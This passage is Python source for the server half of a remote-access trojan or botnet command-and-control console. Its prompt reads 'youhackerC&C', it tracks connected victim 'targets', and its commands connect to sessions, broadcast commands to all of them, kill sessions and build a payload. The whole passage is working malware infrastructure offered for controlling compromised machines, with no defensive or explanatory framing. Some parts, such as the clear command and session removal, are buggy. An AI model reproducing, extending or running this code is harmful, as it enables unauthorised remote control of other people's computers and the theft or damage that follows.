            else:
                reliable_send(target,"quit")
                pass


        except:
            pass


clients = 0
users = []
targets = []
ips = []

stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p = open('serverport.txt', 'r').read()
sock.bind(('', int(p)))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
banner()
print('[+] Waiting For The Incoming Connections ...')

while True:
    command = input('youhackerC&C: ')
    if command == 'hacked':
        counter = 0

        for ip in ips:
            print('Session ' + str(counter) + ' --- ' + str(ip))
            counter += 1
    elif command == 'clear':
        os.system(clear)
    elif command[:7] == 'connect':
        try:
            global num
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum, tarip)
        except:


            print('[-] No Session for that number or session lost')
    elif command == 'help':
        print("""
    banner          --> print the banner
    build           --> build payload
    connect         --> connect to target
    sendall         --> send command to all targets
    hacked          --> see connected targets
    exit            --> exit the C&C
    kill            --> kill session
    rmlist          --> remove disconnected target from list
    clear           --> clear the screen
            """)
    elif command == 'banner':
        banner()
    elif command == 'build':
        build()
    elif command[:6] == 'rmlist':
        try:
            targ = targets[int(command[7:])]
            ip = ips[int(command[7:])]
            targets.remove(targ)
            ips.remove(ip)
            users.remove(users[int(command[7:])])
        except:
            print('This session not Available')

    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command == 'clear':
        os.system(clear)
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
        users.remove(int(command[5:]))


    elif command[:7] == 'sendall':
        x = len(targets)
        i = 0
        try:
            while i < x:
                tarnumber = targets[i]
                print("executed on "+str(ips[i][0]))
                reliable_send(tarnumber, command)
                i += 1
        except Exception as E:
            print(str(E))
            print('Failed')
    else:
        print('[!!] Command Doesnt Exist')
